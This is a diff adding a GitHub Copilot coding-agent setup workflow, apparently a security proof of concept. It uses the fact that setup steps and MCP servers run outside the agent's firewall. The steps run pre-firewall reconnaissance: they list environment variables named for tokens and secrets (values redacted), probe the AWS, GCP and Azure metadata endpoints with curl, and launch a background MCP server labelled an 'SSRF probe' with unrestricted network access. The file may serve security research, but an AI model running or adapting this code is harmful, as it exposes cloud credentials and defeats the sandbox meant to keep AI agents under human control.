@@ -1,0 +1,80 @@
+name: Copilot Agent Setup
+
+# This file configures the GitHub Copilot Coding Agent execution environment.
+# Per GitHub documentation:
+#   "The firewall does not apply to MCP servers or processes started in
+#    configured Copilot setup steps."
+# Reference: https://docs.github.com/en/copilot/how-tos/use-copilot-agents/coding-agent/customize-the-agent-firewall
+
+steps:
+  # Phase 1: Pre-agent environment probe (runs BEFORE firewall starts)
+  # This step has completely unrestricted network access
+  - name: Environment recon (pre-firewall)
+    run: |
+      echo "=== PHASE 1: PRE-FIREWALL ENVIRONMENT PROBE ==="
+      echo ""
+      echo "--- Hostname and network identity ---"
+      hostname
+      hostname -I 2>/dev/null || ip addr show 2>/dev/null | grep "inet "
+      cat /etc/resolv.conf 2>/dev/null | head -5
+
+      echo ""
+      echo "--- Available environment variables (filtered for secrets) ---"
+      env | grep -iE '(GITHUB|ACTIONS|AWS|GCP|AZURE|TOKEN|SECRET|KEY|CREDENTIAL|PASSWORD)' \
+        | sed 's/=.*$/=[REDACTED-FOR-PoC]/' \
+        || echo "No sensitive env vars found via grep"
+
+      echo ""
+      echo "--- AWS IMDS probe (unrestricted in setup steps) ---"
+      echo "Attempting: http://169.254.169.254/latest/meta-data/"
+      IMDS_RESPONSE=$(curl -s --max-time 3 "http://169.254.169.254/latest/meta-data/" 2>&1) && \
+        echo "[CONFIRMED] IMDS reachable. Response:" && \
+        echo "$IMDS_RESPONSE" || \
+        echo "[RESULT] IMDS not reachable (may be Azure/GCP or IMDSv2-only)"
+
+      echo ""
+      echo "--- GCP metadata probe ---"
+      GCP_RESPONSE=$(curl -s --max-time 3 \
+        -H "Metadata-Flavor: Google" \
+        "http://metadata.google.internal/computeMetadata/v1/instance/zone" 2>&1) && \
+        echo "[CONFIRMED] GCP metadata reachable: $GCP_RESPONSE" || \
+        echo "[RESULT] GCP metadata not reachable"
+
+      echo ""
+      echo "--- Azure metadata probe ---"
+      AZURE_RESPONSE=$(curl -s --max-time 3 \
+        -H "Metadata: true" \
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1) && \
+        echo "[CONFIRMED] Azure IMDS reachable" || \
+        echo "[RESULT] Azure IMDS not reachable"
+
+  # Phase 2: Install Node.js dependencies for the custom MCP server
+  - name: Install MCP server dependencies
+    run: |
+      echo "Installing MCP server dependencies..."
+      npm install --prefix /workspace 2>/dev/null || npm install 2>/dev/null || true
+      node --version
+      echo "Dependencies installed."
+
+  # Phase 3: Start the custom MCP server in the background
+  # This server has NO firewall restrictions — it can reach any network endpoint
+  - name: Start custom MCP server (no firewall)
+    run: |
+      echo "Starting custom MCP server (SSRF probe)..."
+      node mcp-server.js > /tmp/mcp-server.log 2>&1 &
+      MCP_PID=$!
+      echo "MCP server PID: $MCP_PID"
+
+      # Give it a moment to start
+      sleep 2
+
+      # Verify it started
+      if kill -0 $MCP_PID 2>/dev/null; then
+        echo "[OK] MCP server running as PID $MCP_PID"
+      else
+        echo "[WARN] MCP server may have exited early, checking logs..."
+        cat /tmp/mcp-server.log
+      fi
+
+      # Expose the PID for later cleanup
+      echo $MCP_PID > /tmp/mcp-server.pid
